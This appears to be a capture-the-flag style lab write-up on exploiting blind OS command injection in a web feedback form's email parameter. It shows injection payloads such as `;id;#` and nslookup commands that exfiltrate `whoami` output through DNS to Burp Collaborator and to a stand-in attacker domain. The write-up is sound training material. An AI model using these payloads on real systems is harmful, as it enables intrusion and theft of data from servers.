# Blind OS command injection with out-of-band data exfiltration

### Goal - 

Exploit blind OS command injection to issue a DNS lookup to Burp Collaborator

### Analysis/Exploitation 

First have a look at the website and its feedback feature. I submit a feedback and send the request to repeater. In the previous lab, we found that the `email` parameter is vulnerable to blind OS command injection:
I assume that the attack vector is the same as in the other labs: the email input field.

try to do **OS command injection** in the `email` parameter:

`;id;#`

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/3cf01424-4157-4060-9e62-40874da27ca0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663RJCYGNU%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204718Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC52S7eW5yRjPxxnQ6%2BiFm%2FwbHzPxZfHQARSH6GNU49VwIhAIhAL2FeOHssgbnaa94lLmyogHv5w%2F1htQe4Q14ZhC8CKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igw%2FadLP1jLEXLL5Xewq3AMLjqhESHwr5%2BX0P2TJuyQ4myVGqN8xebud37DqkmWM4X296NM4QwtEDKog8GOcZO1f4YWeNO%2F8B1%2BUJ7U%2FxTLR5kjDIsOv0METXV84ruJvgW14UiHX68ksAZ99OI6BrGVNVio3UfhAY5sYxzju16ZN01qivAt3oWYuSDx8w78wGS0r1%2FpIlm1TcDylfVZ8A7jWAemVF%2BDoaSdKQKnoPPn7B30u1LsD%2BhmW8g5s0d1KhUTNgccOWZw23sO29pcaUsx7osH4M2QxbWRYmfAmCl7udeYBUo70TBsbgwq5NLWfpQ4FDYhogYRypOuaNLlL4%2B24DCYYmIZFRxM7cm1nyGcKkhhcyKlXhzBtY7VinoNn318avRu13oazN3G6vQcvISwkuzTbEKnQeAEFLazhpSMwO7bxUybIDdXqvC3slxMqPH0fidmluLhGGDW6qRgJifWKmzz%2B0EUXZepOENeyeTJS1h%2BieHoM2GXGf0SPlPYNXBfCD5UzsCditY5lnTaDtuwWkUagvThRTwdYiOPYw8edI2IkpsUExagjZxJ6MhoawJO4%2B8cMHQaD75YSMMzNEcwfvSyTGRdsHEKXjhXupTAzRvrtANd%2B%2Bvoe9q%2BUuyzkLMPzs916iRoQO57UyTDjyKLUBjqkAR%2F%2BbKlb0v1OZjaUfBWxyFmLSwSKoqrsbaOKFotFL6KRlRMqPiI80Iw7Z9wdhpxtj9is7nhzIdhNfC6To%2BW10UJdLl2j5RvoHm90BJRdxj5GLz5k70%2BupKmvkoo8RU7%2Fvk%2FSP9q%2F0GhVt46Hxr%2BEeAIIt3ndhV9UF7vVB4jrQu2Va21pC4cd7PZ8TEnVvUqRekINvGyKkN68a8lFM6JY5TluxfoM&X-Amz-Signature=020c6bc0da2a6d2b660e58d26aa22ba26c8648afbf7ede2ba056f10fde6338e8&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

However, there’s no output of our command in the response, it might be vulnerable to blind OS command injection.

Therefore I open a new Burp Collaborator client and generate a new payload. URLencode the payload to avoid breaking the request.

```bash
;nslookup 8mvkjln6evqts94q7vwt31eziqoic90y.oastify.com;#
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/920c3740-dd8c-4461-923c-60ef01a5914b/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663RJCYGNU%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204718Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC52S7eW5yRjPxxnQ6%2BiFm%2FwbHzPxZfHQARSH6GNU49VwIhAIhAL2FeOHssgbnaa94lLmyogHv5w%2F1htQe4Q14ZhC8CKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igw%2FadLP1jLEXLL5Xewq3AMLjqhESHwr5%2BX0P2TJuyQ4myVGqN8xebud37DqkmWM4X296NM4QwtEDKog8GOcZO1f4YWeNO%2F8B1%2BUJ7U%2FxTLR5kjDIsOv0METXV84ruJvgW14UiHX68ksAZ99OI6BrGVNVio3UfhAY5sYxzju16ZN01qivAt3oWYuSDx8w78wGS0r1%2FpIlm1TcDylfVZ8A7jWAemVF%2BDoaSdKQKnoPPn7B30u1LsD%2BhmW8g5s0d1KhUTNgccOWZw23sO29pcaUsx7osH4M2QxbWRYmfAmCl7udeYBUo70TBsbgwq5NLWfpQ4FDYhogYRypOuaNLlL4%2B24DCYYmIZFRxM7cm1nyGcKkhhcyKlXhzBtY7VinoNn318avRu13oazN3G6vQcvISwkuzTbEKnQeAEFLazhpSMwO7bxUybIDdXqvC3slxMqPH0fidmluLhGGDW6qRgJifWKmzz%2B0EUXZepOENeyeTJS1h%2BieHoM2GXGf0SPlPYNXBfCD5UzsCditY5lnTaDtuwWkUagvThRTwdYiOPYw8edI2IkpsUExagjZxJ6MhoawJO4%2B8cMHQaD75YSMMzNEcwfvSyTGRdsHEKXjhXupTAzRvrtANd%2B%2Bvoe9q%2BUuyzkLMPzs916iRoQO57UyTDjyKLUBjqkAR%2F%2BbKlb0v1OZjaUfBWxyFmLSwSKoqrsbaOKFotFL6KRlRMqPiI80Iw7Z9wdhpxtj9is7nhzIdhNfC6To%2BW10UJdLl2j5RvoHm90BJRdxj5GLz5k70%2BupKmvkoo8RU7%2Fvk%2FSP9q%2F0GhVt46Hxr%2BEeAIIt3ndhV9UF7vVB4jrQu2Va21pC4cd7PZ8TEnVvUqRekINvGyKkN68a8lFM6JY5TluxfoM&X-Amz-Signature=e02d0478f640bceb1f254a5fe4bbb2621ff4140531127e7655e79cf6b863ff58&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

we successfully received 2 DNS lookups, which means the feedback function is indeed vulnerable to blind OS command injection!!

Once we’ve confirmed blind OS command injection, we can exfiltrate the output from injected commands using OAST techniques:

> 💡 The out-of-band channel provides an easy way to exfiltrate the output from injected commands:

```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

This causes a DNS lookup to the attacker's domain containing the result of the `whoami` command:

```bash
wwwuser.kgji2ohoyw.web-attacker.com
```

Add the output of `whoami` as subdomain to the domain name provided but Burp Collaborator and send the request. URLencode the payload to avoid breaking the request.

```bash
; nslookup `whoami`.8mvkjln6evqts94q7vwt31eziqoic90y.burpcollaborator.net; #
or
; nslookup $(whoami).8mvkjln6evqts94q7vwt31eziqoic90y.burpcollaborator.net; #
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/0ede8f97-e945-4d3d-a9af-76c2069b3801/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663RJCYGNU%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204718Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC52S7eW5yRjPxxnQ6%2BiFm%2FwbHzPxZfHQARSH6GNU49VwIhAIhAL2FeOHssgbnaa94lLmyogHv5w%2F1htQe4Q14ZhC8CKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igw%2FadLP1jLEXLL5Xewq3AMLjqhESHwr5%2BX0P2TJuyQ4myVGqN8xebud37DqkmWM4X296NM4QwtEDKog8GOcZO1f4YWeNO%2F8B1%2BUJ7U%2FxTLR5kjDIsOv0METXV84ruJvgW14UiHX68ksAZ99OI6BrGVNVio3UfhAY5sYxzju16ZN01qivAt3oWYuSDx8w78wGS0r1%2FpIlm1TcDylfVZ8A7jWAemVF%2BDoaSdKQKnoPPn7B30u1LsD%2BhmW8g5s0d1KhUTNgccOWZw23sO29pcaUsx7osH4M2QxbWRYmfAmCl7udeYBUo70TBsbgwq5NLWfpQ4FDYhogYRypOuaNLlL4%2B24DCYYmIZFRxM7cm1nyGcKkhhcyKlXhzBtY7VinoNn318avRu13oazN3G6vQcvISwkuzTbEKnQeAEFLazhpSMwO7bxUybIDdXqvC3slxMqPH0fidmluLhGGDW6qRgJifWKmzz%2B0EUXZepOENeyeTJS1h%2BieHoM2GXGf0SPlPYNXBfCD5UzsCditY5lnTaDtuwWkUagvThRTwdYiOPYw8edI2IkpsUExagjZxJ6MhoawJO4%2B8cMHQaD75YSMMzNEcwfvSyTGRdsHEKXjhXupTAzRvrtANd%2B%2Bvoe9q%2BUuyzkLMPzs916iRoQO57UyTDjyKLUBjqkAR%2F%2BbKlb0v1OZjaUfBWxyFmLSwSKoqrsbaOKFotFL6KRlRMqPiI80Iw7Z9wdhpxtj9is7nhzIdhNfC6To%2BW10UJdLl2j5RvoHm90BJRdxj5GLz5k70%2BupKmvkoo8RU7%2Fvk%2FSP9q%2F0GhVt46Hxr%2BEeAIIt3ndhV9UF7vVB4jrQu2Va21pC4cd7PZ8TEnVvUqRekINvGyKkN68a8lFM6JY5TluxfoM&X-Amz-Signature=9dd2bf58d36fd4dc2594f019bef5d5193e28d7f336c3524232a251b10e1f56fc&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

The username is shown in the DNS request:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/91b1cdca-b79b-4600-b61a-bbb70e358201/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663RJCYGNU%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204718Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC52S7eW5yRjPxxnQ6%2BiFm%2FwbHzPxZfHQARSH6GNU49VwIhAIhAL2FeOHssgbnaa94lLmyogHv5w%2F1htQe4Q14ZhC8CKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igw%2FadLP1jLEXLL5Xewq3AMLjqhESHwr5%2BX0P2TJuyQ4myVGqN8xebud37DqkmWM4X296NM4QwtEDKog8GOcZO1f4YWeNO%2F8B1%2BUJ7U%2FxTLR5kjDIsOv0METXV84ruJvgW14UiHX68ksAZ99OI6BrGVNVio3UfhAY5sYxzju16ZN01qivAt3oWYuSDx8w78wGS0r1%2FpIlm1TcDylfVZ8A7jWAemVF%2BDoaSdKQKnoPPn7B30u1LsD%2BhmW8g5s0d1KhUTNgccOWZw23sO29pcaUsx7osH4M2QxbWRYmfAmCl7udeYBUo70TBsbgwq5NLWfpQ4FDYhogYRypOuaNLlL4%2B24DCYYmIZFRxM7cm1nyGcKkhhcyKlXhzBtY7VinoNn318avRu13oazN3G6vQcvISwkuzTbEKnQeAEFLazhpSMwO7bxUybIDdXqvC3slxMqPH0fidmluLhGGDW6qRgJifWKmzz%2B0EUXZepOENeyeTJS1h%2BieHoM2GXGf0SPlPYNXBfCD5UzsCditY5lnTaDtuwWkUagvThRTwdYiOPYw8edI2IkpsUExagjZxJ6MhoawJO4%2B8cMHQaD75YSMMzNEcwfvSyTGRdsHEKXjhXupTAzRvrtANd%2B%2Bvoe9q%2BUuyzkLMPzs916iRoQO57UyTDjyKLUBjqkAR%2F%2BbKlb0v1OZjaUfBWxyFmLSwSKoqrsbaOKFotFL6KRlRMqPiI80Iw7Z9wdhpxtj9is7nhzIdhNfC6To%2BW10UJdLl2j5RvoHm90BJRdxj5GLz5k70%2BupKmvkoo8RU7%2Fvk%2FSP9q%2F0GhVt46Hxr%2BEeAIIt3ndhV9UF7vVB4jrQu2Va21pC4cd7PZ8TEnVvUqRekINvGyKkN68a8lFM6JY5TluxfoM&X-Amz-Signature=a1f467453b67e5f4b3a90a4c4fb197950dbb2c37e2d2606d0266b85d03a7a624&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


